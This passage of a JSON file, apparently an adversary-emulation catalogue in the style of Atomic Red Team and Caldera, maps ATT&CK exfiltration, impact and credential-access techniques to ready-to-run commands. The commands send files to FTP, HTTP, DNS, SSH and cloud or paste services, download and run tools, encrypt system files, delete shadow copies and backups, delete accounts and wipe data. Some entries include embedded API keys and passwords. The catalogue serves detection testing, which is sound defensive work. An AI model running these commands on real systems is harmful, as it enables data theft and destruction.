         "command": "if [ -f $PathToAtomicsFolder/T1552/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1552/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1552/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1552/src; echo \"starting warmup\"; ./stratus warmup aws.credential-access.ec2-get-password-data; echo \"starting detonate\"; ./stratus detonate aws.credential-access.ec2-get-password-data --force"
      }
   ],
   "T1048.003": [
      {
         "technique_id": "T1048.003",
         "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
         "tactic": "exfiltration",
         "description": "Exfiltration of specified file over SMTP.\nUpon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.\n",
         "command": "Send-MailMessage -From"
      },
      {
         "technique_id": "T1048.003",
         "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
         "tactic": "exfiltration",
         "description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n",
         "command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\\Windows\\System32\\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send(\"127.0.0.1\", 1500, $Data) }"
      },
      {
         "technique_id": "T1048.003",
         "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
         "tactic": "exfiltration",
         "description": "An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.\n",
         "command": "if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi"
      },
      {
         "technique_id": "T1048.003",
         "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
         "tactic": "exfiltration",
         "description": "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.\nUpon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server. \nReference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
         "command": "$Dir_to_copy = \"$env:windir\\temp\"; $ftp = \"ftp://#{ftp_server}/\"; $web_client = New-Object System.Net.WebClient; $web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}'); if (test-connection -count 1 -computername \"#{ftp_server}\" -quiet); {foreach($file in (dir $Dir_to_copy \"*.7z\")); {echo \"Uploading $file...\"; $uri = New-Object System.Uri($ftp+$file.name); $web_client.UploadFile($uri, $file.FullName)}}; else; {echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}"
      },
      {
         "technique_id": "T1048.003",
         "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
         "tactic": "exfiltration",
         "description": "Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.\n[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)",
         "command": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName; $exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName; &$rclone_bin config create ftpserver \"ftp\" \"host\"; &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate"
      },
      {
         "technique_id": "T1048.003",
         "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
         "tactic": "exfiltration",
         "description": "Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.\n",
         "command": "$content = Get-Content C:\\Windows\\System32\\notepad.exe; Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content"
      },
      {
         "technique_id": "T1048.003",
         "technique_name": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
         "tactic": "exfiltration",
         "description": "This ability exfiltrates a compressed archive to an FTP server.",
         "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ncurl -T #{host.dir.compress} ftp://#{ftp.server.address}/$RemoteName --user #{ftp.user.name}:'#{ftp.user.password}'\n"
      }
   ],
   "T1567.002": [
      {
         "technique_id": "T1567.002",
         "technique_name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
         "tactic": "exfiltration",
         "description": "This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\n",
         "command": "New-Item $env:appdata\\rclone -ItemType directory; New-Item $env:appdata\\rclone\\rclone.conf; cd \"C:\\Users\\puma-4\\Desktop\"; .\\rclone.exe config create T1567002 mega; set-Content $env:appdata\\rclone\\rclone.conf \"[T1567002] `n type = mega `n user = atomictesting@outlook.com `n pass = vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA\"; .\\rclone.exe copy --max-size 1700k \"C:\\Users\\puma-4\\Desktop\" T1567002:test -v"
      },
      {
         "technique_id": "T1567.002",
         "technique_name": "Exfiltration to Cloud Storage",
         "tactic": "exfiltration",
         "description": "This will exfiltrate an archive to Dropbox.",
         "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)\";\n$TargetFilePath = \"/#{dropbox.target.dir}/$RemoteName\";\n$ApiKey = \"#{dropbox.api.key}\";\n\n$url = \"https://content.dropboxapi.com/2/files/upload\";\n\n$file = [IO.File]::ReadAllBytes($SourceFile);\n[net.httpWebRequest] $req = [net.webRequest]::create($url);\n\n$arg = '{ \"path\": \"' + $TargetFilePath + '\", \"mode\": \"add\", \"autorename\": true, \"mute\": false }';\n$authorization = \"Bearer \" + $ApiKey;\n\n$req.method = \"POST\";\n$req.Headers.Add(\"Authorization\", $authorization);\n$req.Headers.Add(\"Dropbox-API-Arg\", $arg);\n$req.ContentType = 'application/octet-stream';\n$req.ContentLength = $file.length;\n$req.TimeOut = 50000;\n$req.KeepAlive = $true;\n$req.Headers.Add(\"Keep-Alive: 300\");\n$reqst = $req.getRequestStream();\n$reqst.write($file, 0, $file.length);\n$reqst.flush();\n$reqst.close();\n\n[net.httpWebResponse] $res = $req.getResponse();\n$resst = $res.getResponseStream();\n$sr = new-object IO.StreamReader($resst);\n$result = $sr.ReadToEnd();\n$result;\n$res.close();\n"
      },
      {
         "technique_id": "T1567.002",
         "technique_name": "Exfiltration to Cloud Storage",
         "tactic": "exfiltration",
         "description": "Exfiltrate the compressed archive to the provided S3 bucket using the AWS CLI. It is assumed that the user\ncredentials configured with AWS CLI have the proper permissions to write to the target S3 bucket.\n",
         "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;\n"
      },
      {
         "technique_id": "T1567.002",
         "technique_name": "Exfiltration to Cloud Storage",
         "tactic": "exfiltration",
         "description": "Use the AWS SDK for GoLang to upload the compressed archive to the provided S3 bucket.\nIt is assumed that the current user credentials have the proper permissions to write to the target S3 bucket.\nRequires the agent to be compiled with the native_aws extension.\nTimeout set to 45 seconds.\n",
         "command": "s3upload \"#{host.dir.compress}\" \"#{s3.source.region}\" \"#{s3.source.name}\" \"aws-#{paw}-compressed\" 45s\n"
      }
   ],
   "T1041": [
      {
         "technique_id": "T1041",
         "technique_name": "Exfiltration Over C2 Channel",
         "tactic": "exfiltration",
         "description": "Exfiltrates a file present on the victim machine to the C2 server.\n",
         "command": "if(-not (Test-Path $env:TEMP\\LineNumbers.txt)){ ;   1..100 | ForEach-Object { Add-Content -Path $env:TEMP\\LineNumbers.txt -Value \"This is line $_.\" }; }; [System.Net.ServicePointManager]::Expect100Continue = $false; $filecontent = Get-Content -Path $env:TEMP\\LineNumbers.txt; Invoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive"
      },
      {
         "technique_id": "T1041",
         "technique_name": "Exfiltration Over C2 Channel",
         "tactic": "exfiltration",
         "description": "Exfil the staged directory",
         "command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"
      }
   ],
   "T1048.002": [
      {
         "technique_id": "T1048.002",
         "technique_name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
         "tactic": "exfiltration",
         "description": "Exfiltrate data HTTPS using curl to file share site file.io\n",
         "command": "curl -F 'file=@3945c9_artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/"
      },
      {
         "technique_id": "T1048.002",
         "technique_name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
         "tactic": "exfiltration",
         "description": "Exfiltrate data HTTPS using curl to file share site file.io\n",
         "command": "C:\\Windows\\System32\\Curl.exe -F 'file=@3945c9_artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/"
      }
   ],
   "T1030": [
      {
         "technique_id": "T1030",
         "technique_name": "Data Transfer Size Limits",
         "tactic": "exfiltration",
         "description": "Take a file/directory, split it into 5Mb chunks\n",
         "command": "if [ ! -f /tmp/T1030/T1030_urandom ]; then if [ ! -d /tmp/T1030 ]; then mkdir -p /tmp/T1030; touch /tmp/T1030/safe_to_delete; fi; dd if=/dev/urandom of=/tmp/T1030/T1030_urandom bs=25000000 count=1; fi;  ;  cd /tmp/T1030; split -b 5000000 T1030_urandom; ls -l /tmp/T1030"
      },
      {
         "technique_id": "T1030",
         "technique_name": "Data Transfer Size Limits",
         "tactic": "exfiltration",
         "description": "This ability will compress the staged files into a password protected archive and break it\ninto smaller chunks based on the given byte size. The original archive will be automatically\ndeleted. Use this instead of other archiving abilities if small file sizes for exfiltration \nare desired. When used with an exfiltration ability, the exfiltration ability will run numerous\ntimes in an operation depending on how many chunks are created. \n",
         "command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase '#{host.archive.password}' > #{host.dir.staged}.tar.gz.gpg;\nsplit -b#{file.size.chunk} '#{host.dir.staged}.tar.gz.gpg' '#{host.dir.staged}'/calderachunk;\nrm '#{host.dir.staged}.tar.gz.gpg';\nfind '#{host.dir.staged}' -maxdepth 1 -name 'calderachunk*' 2>/dev/null;\n"
      }
   ],
   "T1048": [
      {
         "technique_id": "T1048",
         "technique_name": "Exfiltration Over Alternative Protocol",
         "tactic": "exfiltration",
         "description": "DNSExfiltrator allows for transferring (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github page for more details - https://github.com/Arno0x/DNSExfiltrator\n",
         "command": ". \"C:\\Users\\puma-4\\Desktop\\Invoke-DNSExfiltrator.ps1\"; Invoke-DNSExfiltrator -i \"C:\\Users\\puma-4\\Desktop\\Invoke-DNSExfiltrator.ps1\" -d target.example.com -p atomic -doh google -t 500 None"
      },
      {
         "technique_id": "T1048",
         "technique_name": "Exfiltration Over Alternative Protocol",
         "tactic": "exfiltration",
         "description": "Input a domain and test Exfiltration over SSH\n\nLocal to Remote\n\nUpon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.\n",
         "command": "tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'"
      },
      {
         "technique_id": "T1048",
         "technique_name": "Exfiltration Over Alternative Protocol",
         "tactic": "exfiltration",
         "description": "Input a domain and test Exfiltration over SSH\n\nRemote to Local\n\nUpon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.\n",
         "command": "ssh target.example.com \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz"
      }
   ],
   "T1020": [
      {
         "technique_id": "T1020",
         "technique_name": "Automated Exfiltration",
         "tactic": "exfiltration",
         "description": "Creates a text file\nTries to upload to a server via HTTP PUT method with ContentType Header\nDeletes a created file",
         "command": "$fileName = \"C:\\temp\\T1020_exfilFile.txt\"; $url = \"https://google.com\"; $file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"; $contentType = \"application/octet-stream\"; try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}"
      }
   ],
   "T1567.003": [
      {
         "technique_id": "T1567.003",
         "technique_name": "Exfiltration Over Web Service: Exfiltration to Text Storage Sites",
         "tactic": "exfiltration",
         "description": "This test uses HTTP POST to exfiltrate data to a remote text storage site. (pastebin)                             \nSee https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it                \n",
         "command": "$apiKey = \"6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0\"; $content = \"secrets, api keys, passwords...\"; $url = \"https://pastebin.com/api/api_post.php\"; $postData = @{;   api_dev_key   = $apiKey;   api_option    = \"paste\";   api_paste_code = $content; }; $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData; Write-Host \"Your paste URL: $response\""
      }
   ],
   "T1486": [
      {
         "technique_id": "T1486",
         "technique_name": "Data Encrypted for Impact",
         "tactic": "impact",
         "description": "Uses openssl to encrypt a file\n",
         "command": "$which_openssl genrsa -out /tmp/key.pem 2048; $which_openssl rsa -in /tmp/key.pem -pubout -out /tmp/pub.pem; $which_openssl rsautl -encrypt -inkey /tmp/pub.pem -pubin -in /etc/passwd -out /tmp/passwd.zip"
      },
      {
         "technique_id": "T1486",
         "technique_name": "Data Encrypted for Impact",
         "tactic": "impact",
         "description": "Uses gpg to encrypt a file\n",
         "command": "echo \"passwd\" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo AES-256 -o /tmp/passwd.gpg -c /etc/passwd"
      },
      {
         "technique_id": "T1486",
         "technique_name": "Data Encrypted for Impact",
         "tactic": "impact",
         "description": "Uses 7z to encrypt a file\n",
         "command": "$which_7z a -ppasswd /tmp/passwd.zip /etc/passwd"
      },
      {
         "technique_id": "T1486",
         "technique_name": "Data Encrypted for Impact",
         "tactic": "impact",
         "description": "Gpg4win is a Windows tool (also called Kleopatra which is the preferred certificate manager) that uses email and file encryption packages for symmetric encryption. It is used by attackers to encrypt disks. User will need to add pass phrase to encrypt file as automation is not allowed under newer versions.",
         "command": "if (test-path 'C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe') { ; } else {New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null; invoke-webrequest \"https://files.gpg4win.org/gpg4win-4.1.0.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe\"; cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe\" /S};  ;  cmd /c 'C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe' -c '$env:temp\\test.txt'"
      },
      {
         "technique_id": "T1486",
         "technique_name": "Data Encrypted for Impact",
         "tactic": "impact",
         "description": "This test encrypts the file(s) using the 7z utility\n",
         "command": "7z a -p ARTPass -mhe=on ARTArchive.7z ~/test.txt"
      },
      {
         "technique_id": "T1486",
         "technique_name": "Data Encrypted for Impact",
         "tactic": "impact",
         "description": "Attempts to encrypt data on target systems as root to simulate an inturruption authentication to target system. If root permissions are not available then attempts to encrypt data within user's home directory.\n",
         "command": "if [[ $USER == \"root\" ]]; then $which_ccencrypt /etc/passwd; file /etc/passwd.cpt; sudo su; else $which_ccencrypt ~/.bash_history; file ~/.bash_history.cpt; sudo su; fi"
      },
      {
         "technique_id": "T1486",
         "technique_name": "Data Encrypted for Impact",
         "tactic": "impact",
         "description": "building the IOC (YOUR_FILES.txt) for the PureLocker ransomware \nhttps://www.bleepingcomputer.com/news/security/purelocker-ransomware-can-lock-files-on-windows-linux-and-macos/\n",
         "command": "echo T1486 - Purelocker Ransom Note > %USERPROFILE%\\Desktop\\YOUR_FILES.txt"
      },
      {
         "technique_id": "T1486",
         "technique_name": "Data Encrypted for Impact",
         "tactic": "impact",
         "description": "This test encrypts the file(s) using the openssl utility\n",
         "command": "openssl enc -pbkdf2 -in ~/test.txt -out ARTFile"
      }
   ],
   "T1529": [
      {
         "technique_id": "T1529",
         "technique_name": "System Shutdown/Reboot",
         "tactic": "impact",
         "description": "This test shuts down a Linux system using `halt`.\n",
         "command": "halt -p"
      },
      {
         "technique_id": "T1529",
         "technique_name": "System Shutdown/Reboot",
         "tactic": "impact",
         "description": "This test shuts down a Windows system.\n",
         "command": "shutdown /s /t 1"
      },
      {
         "technique_id": "T1529",
         "technique_name": "System Shutdown/Reboot",
         "tactic": "impact",
         "description": "This test restarts a macOS/Linux system.\n",
         "command": "shutdown -r now"
      },
      {
         "technique_id": "T1529",
         "technique_name": "System Shutdown/Reboot",
         "tactic": "impact",
         "description": "This test shuts down a Linux system using `poweroff`.\n",
         "command": "poweroff"
      },
      {
         "technique_id": "T1529",
         "technique_name": "System Shutdown/Reboot",
         "tactic": "impact",
         "description": "This test restarts a Windows system.\n",
         "command": "shutdown /r /t 1"
      },
      {
         "technique_id": "T1529",
         "technique_name": "System Shutdown/Reboot",
         "tactic": "impact",
         "description": "This test restarts a Linux system using `poweroff`.\n",
         "command": "poweroff --reboot"
      },
      {
         "technique_id": "T1529",
         "technique_name": "System Shutdown/Reboot",
         "tactic": "impact",
         "description": "This test performs a Windows system logoff as seen in [dcrat backdoor capabilities](https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor)\n",
         "command": "shutdown /l"
      },
      {
         "technique_id": "T1529",
         "technique_name": "System Shutdown/Reboot",
         "tactic": "impact",
         "description": "This test shuts down a macOS/Linux system using a halt.\n",
         "command": "shutdown -h now"
      },
      {
         "technique_id": "T1529",
         "technique_name": "System Shutdown/Reboot",
         "tactic": "impact",
         "description": "This test restarts a macOS/Linux system via `reboot`.\n",
         "command": "reboot"
      },
      {
         "technique_id": "T1529",
         "technique_name": "System Shutdown/Reboot",
         "tactic": "impact",
         "description": "This test restarts a Linux system using `halt`.\n",
         "command": "halt --reboot"
      }
   ],
   "T1490": [
      {
         "technique_id": "T1490",
         "technique_name": "Inhibit System Recovery",
         "tactic": "impact",
         "description": "Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nShadow copies can only be created on Windows server or Windows 8.\n",
         "command": "wmic.exe shadowcopy delete"
      },
      {
         "technique_id": "T1490",
         "technique_name": "Inhibit System Recovery",
         "tactic": "impact",
         "description": "Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,\n\"The backup catalog has been successfully deleted.\" will be displayed in the PowerShell session.\n",
         "command": "wbadmin delete catalog -quiet"
      },
      {
         "technique_id": "T1490",
         "technique_name": "Inhibit System Recovery",
         "tactic": "impact",
         "description": "Deletes the Windows systemstatebackup using wbadmin.exe. This technique is used by numerous ransomware families. This may only be successful on server platforms that have Windows Backup enabled.\n",
         "command": "wbadmin delete systemstatebackup -keepVersions:0"
      },
      {
         "technique_id": "T1490",
         "technique_name": "Inhibit System Recovery",
         "tactic": "impact",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable system restore on the computer. \nSee how remcos RAT abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
         "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f && reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f && reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f"
      },
      {
         "technique_id": "T1490",
         "technique_name": "Inhibit System Recovery",
         "tactic": "impact",
         "description": "Use schtasks.exe to disable the System Restore (SR) scheduled task\n",
         "command": "schtasks.exe /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /disable"
      },
      {
         "technique_id": "T1490",
         "technique_name": "Inhibit System Recovery",
         "tactic": "impact",
         "description": "Adversaries generally try to Resize Shadowstorage Volume using vssadmin.exe to avoid the shadow volumes being made again. This technique is typically found used by adversaries during a ransomware event and a precursor to deleting the shadowstorage.",
         "command": "vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%"
      },
      {
         "technique_id": "T1490",
         "technique_name": "Inhibit System Recovery",
         "tactic": "impact",
         "description": "Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nUpon execution, \"The operation completed successfully.\" will be displayed in the powershell session.\n",
         "command": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures && bcdedit.exe /set {default} recoveryenabled no"
      },
      {
         "technique_id": "T1490",
         "technique_name": "Inhibit System Recovery",
         "tactic": "impact",
         "description": "Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.\nThis technique is used by numerous ransomware families such as Sodinokibi/REvil.\nExecutes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution\nthere may be no output displayed.\n",
         "command": "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}"
      },
      {
         "technique_id": "T1490",
         "technique_name": "Inhibit System Recovery",
         "tactic": "impact",
         "description": "Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon\nexecution, if no shadow volumes exist the message \"No items found that satisfy the query.\" will be displayed. If shadow volumes are present, it\nwill delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n\nconfirmation prompt. Shadow copies can only be created on Windows server or Windows 8.\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)\n",
         "command": "vssadmin.exe delete shadows /all /quiet"
      },
      {
         "technique_id": "T1490",
         "technique_name": "Inhibit System Recovery",
         "tactic": "impact",
         "description": "Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many \"access is denied\" messages will appear as the commands try\nto delete files from around the system.\n",
         "command": "del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk"
      }
   ],
   "T1489": [
      {
         "technique_id": "T1489",
         "technique_name": "Service Stop",
         "tactic": "impact",
         "description": "Stops a specified service using the sc.exe command. Upon execution, if the spooler service was running infomration will be displayed saying\nit has changed to a state of STOP_PENDING. If the spooler service was not running \"The service has not been started.\" will be displayed and it can be\nstarted by running the cleanup command.\n",
         "command": "sc.exe stop spooler"
      },
      {
         "technique_id": "T1489",
         "technique_name": "Service Stop",
         "tactic": "impact",
         "description": "Stops a specified service using the net.exe command. Upon execution, if the service was running \"The Print Spooler service was stopped successfully.\"\nwill be displayed. If the service was not running, \"The Print Spooler service is not started.\" will be displayed and it can be\nstarted by running the cleanup command.\n",
         "command": "net.exe stop spooler"
      },
      {
         "technique_id": "T1489",
         "technique_name": "Service Stop",
         "tactic": "impact",
         "description": "Stops a specified service killng the service's process.\nThis technique was used by WannaCry. Upon execution, if the spoolsv service was running \"SUCCESS: The process \"spoolsv.exe\" with PID 2316 has been terminated.\"\nwill be displayed. If the service was not running \"ERROR: The process \"spoolsv.exe\" not found.\" will be displayed and it can be\nstarted by running the cleanup command.\n",
         "command": "taskkill.exe /f /im spoolsv.exe"
      },
      {
         "technique_id": "T1489",
         "technique_name": "Service Stop",
         "tactic": "impact",
         "description": "Quit Outlook",
         "command": "quit app \"Microsoft Outlook.app\""
      }
   ],
   "T1531": [
      {
         "technique_id": "T1531",
         "technique_name": "Account Access Removal",
         "tactic": "impact",
         "description": "This test deletes the user account using the sysadminctl utility.\n",
         "command": "sysadminctl -deleteUser ARTUserAccount"
      },
      {
         "technique_id": "T1531",
         "technique_name": "Account Access Removal",
         "tactic": "impact",
         "description": "This test will remove an account from the domain admins group\n",
         "command": "$PWord = ConvertTo-SecureString -String; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList; if((Get-ADUser;   Remove-ADGroupMember -Identity \"Domain Admins\" -Members; } else{;     write-host \"Error - Make sure #{remove_user} is in the domain admins group\" -foregroundcolor Red; }"
      },
      {
         "technique_id": "T1531",
         "technique_name": "Account Access Removal",
         "tactic": "impact",
         "description": "Changes the user password to hinder access attempts. Seen in use by LockerGoga. Upon execution, log into the user account \"AtomicAdministrator\" with\nthe password \"HuHuHUHoHo283283\".\n",
         "command": "net user AtomicAdministrator User2ChangePW! /add && net.exe user AtomicAdministrator HuHuHUHoHo283283@dJD"
      },
      {
         "technique_id": "T1531",
         "technique_name": "Account Access Removal",
         "tactic": "impact",
         "description": "Deletes a user account to prevent access. Upon execution, run the command \"net user\" to verify that the new \"AtomicUser\" account was deleted.\n",
         "command": "net user AtomicUser User2DeletePW! /add && net.exe user AtomicUser /delete"
      },
      {
         "technique_id": "T1531",
         "technique_name": "Account Access Removal",
         "tactic": "impact",
         "description": "This test deletes the user account using the dscl utility.\n",
         "command": "dscl . -delete /Users/ARTUser"
      },
      {
         "technique_id": "T1531",
         "technique_name": "Account Access Removal",
         "tactic": "impact",
         "description": "Deletes a user in Azure AD. Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (excluding changed credentials) to remove access to accounts.",
         "command": "Connect-AzureAD; $userprincipalname = \"atomicredteam@yourdomain.com\"; Remove-AzureADUser -ObjectId $userprincipalname"
      },
      {
         "technique_id": "T1531",
         "technique_name": "Account Access Removal",
         "tactic": "impact",
         "description": "Deletes a user in Azure AD. Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (excluding changed credentials) to remove access to accounts.",
         "command": "az login; $userprincipalname = \"atomicredteam@yourdomain.com\"; az ad user delete --id $userprincipalname"
      },
      {
         "technique_id": "T1531",
         "technique_name": "Account Access Removal",
         "tactic": "impact",
         "description": "This test changes the user password to hinder access to the account using passwd utility.\n",
         "command": "passwd ARTUser"
      }
   ],
   "T1485": [
      {
         "technique_id": "T1485",
         "technique_name": "Data Destruction",
         "tactic": "impact",
         "description": "Overwrites and deletes a file using DD.\nTo stop the test, break the command with CTRL/CMD+C.\n",
         "command": "dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog | awk '{print $5}') iflag=count_bytes"
      },
      {
         "technique_id": "T1485",
         "technique_name": "Data Destruction",
         "tactic": "impact",
         "description": "This Atomic will create a Google Storage Bucket then delete it. The idea for this Atomic came from a Rule published by the Elastic team.\n\nIdentifies when a Google Cloud Platform (GCP) storage bucket is deleted. An adversary may delete a storage bucket in order to disrupt their target's business operations.\nThis atomic will create a bucket then delete the bucket.\n\nReference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/impact_gcp_storage_bucket_deleted.toml\n",
         "command": "gcloud config set project atomic-test-1; gcloud storage buckets delete gs://atomic-red-team-bucket"
      },
      {
         "technique_id": "T1485",
         "technique_name": "Data Destruction",
         "tactic": "impact",
         "description": "RansomEXX malware removes all deleted files using windows built-in cipher.exe to prevent forensic recover.\nThis process is very slow and test execution may timeout. \nhttps://www.cybereason.com/blog/cybereason-vs.-ransomexx-ransomware\nhttps://support.microsoft.com/en-us/topic/cipher-exe-security-tool-for-the-encrypting-file-system-56c85edd-85cf-ac07-f2f7-ca2d35dab7e4\n",
         "command": "cipher.exe /w:C:"
      },
      {
         "technique_id": "T1485",
         "technique_name": "Data Destruction",
         "tactic": "impact",
         "description": "Overwrites and deletes a file using SysInternals SDelete. Upon successful execution, \"Files deleted: 1\" will be displayed in\nthe powershell session along with other information about the file that was deleted.\n",
